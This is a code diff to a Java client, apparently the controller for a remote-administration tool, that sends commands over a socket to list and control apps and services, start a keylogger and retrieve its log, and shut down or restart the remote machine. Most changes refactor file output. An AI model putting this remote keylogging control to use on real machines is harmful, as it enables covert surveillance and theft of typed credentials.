@@ -1,10 +1,10 @@
-import javax.imageio.ImageIO;
-import java.awt.image.BufferedImage;
 import java.io.*;
 import java.net.Socket;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
+import java.util.Arrays;
+import java.util.List;
 import java.util.Scanner;
 
 public class Client {
@@ -24,8 +24,8 @@ public class Client {
             while (!exit) {
                 System.out.println("\n MENU");
                 System.out.println("0. Exit");
-                System.out.println("1. Get Apps List");
-                System.out.println("2. Get Services List");
+                System.out.println("1. Get Apps");
+                System.out.println("2. Get Services");
                 System.out.println("3. Start App");
                 System.out.println("4. Stop App");
                 System.out.println("5. Start Service");
@@ -52,8 +52,23 @@ public class Client {
                         writer.flush();
 
                         response = reader.readLine();
-                        System.out.println("Apps List:");
-                        System.out.println(response);
+                        List<String> apps = Arrays.asList(response.split(";"));
+
+                        Path filePathApps = Paths.get(fileAddress + "/apps.txt");
+
+                        if (Files.isDirectory(filePathChecker.getParent()) && Files.isWritable(filePathChecker)) {
+                            try (BufferedWriter bw = Files.newBufferedWriter(filePathApps)) {
+                                for (String app : apps) {
+                                    bw.write(app);
+                                    bw.newLine();
+                                }
+                            } catch (IOException e) {
+                                e.printStackTrace();
+                            }
+                            System.out.println("A new file has been added to: " + fileAddress);
+                        } else {
+                            System.out.println("Invalid file address or write permissions denied.");
+                        }
                         break;
 
                     case 2:
@@ -61,8 +76,16 @@ public class Client {
                         writer.flush();
 
                         response = reader.readLine();
-                        System.out.println("Service List:");
-                        System.out.println(response);
+                        byte[] serviceBytes = response.getBytes();
+
+                        Path filePathServices = Paths.get(fileAddress + "/services.txt");
+
+                        if (Files.isDirectory(filePathChecker.getParent()) && Files.isWritable(filePathChecker)) {
+                            Files.write(filePathServices, serviceBytes);
+                            System.out.println("A new file has been added to: " + fileAddress);
+                        } else {
+                            System.out.println("Invalid file address or write permissions denied.");
+                        }
                         break;
 
                     case 3:
@@ -149,7 +172,7 @@ public class Client {
                             } else {
                                 System.out.println("Invalid file address or write permissions denied.");
                             }
-                        }else {
+                        } else {
                             System.out.println("Incomplete file transfer.");
                         }
                         break;
@@ -157,7 +180,8 @@ public class Client {
                     case 8:
                         writer.println("start-keylogger");
                         writer.flush();
-                        System.out.println(reader.readLine());
+                        response = reader.readLine();
+                        System.out.println(response);
                         break;
 
                     case 9:
@@ -165,13 +189,13 @@ public class Client {
                         writer.flush();
 
                         response = reader.readLine();
-                        byte[] bytes = response.getBytes();
+                        byte[] keyloggerBytes = response.getBytes();
 
                         Path filePathKeylogger = Paths.get(fileAddress + "/keylogger.txt");
 
                         if (Files.isDirectory(filePathChecker.getParent()) && Files.isWritable(filePathChecker)) {
-                            Files.write(filePathKeylogger, bytes);
-                                System.out.println("A new file has been added to: " + fileAddress);
+                            Files.write(filePathKeylogger, keyloggerBytes);
+                            System.out.println("A new file has been added to: " + fileAddress);
                         } else {
                             System.out.println("Invalid file address or write permissions denied.");
                         }
@@ -180,19 +204,22 @@ public class Client {
                     case 10:
                         writer.println("shutdown");
                         writer.flush();
-                        System.out.println(reader.readLine());
+                        response = reader.readLine();
+                        System.out.println(response);
                         break;
 
                     case 11:
                         writer.println("restart");
                         writer.flush();
-                        System.out.println(reader.readLine());
+                        response = reader.readLine();
+                        System.out.println(response);
                         break;
 
                     case 12:
                         writer.println("cancel-shutdown");
                         writer.flush();
-                        System.out.println(reader.readLine());
+                        response = reader.readLine();
+                        System.out.println(response);
                         break;
 
                     case 13:
@@ -239,19 +266,5 @@ public class Client {
         } catch (Exception e) {
             e.printStackTrace();
         }
-    }
-
-    private static ByteArrayInputStream getByteArrayInputStream(int screenshotSize, Socket socket) throws IOException {
-        byte[] screenshotBytes = new byte[screenshotSize];
-
-        InputStream in = socket.getInputStream();
-        int bytesReadScreenshot = 0;
-
-        while (bytesReadScreenshot < screenshotSize) {
-            bytesReadScreenshot += in.read(screenshotBytes, bytesReadScreenshot, screenshotSize - bytesReadScreenshot);
-        }
-
-        ByteArrayInputStream bais = new ByteArrayInputStream(screenshotBytes);
-        return bais;
     }
 }
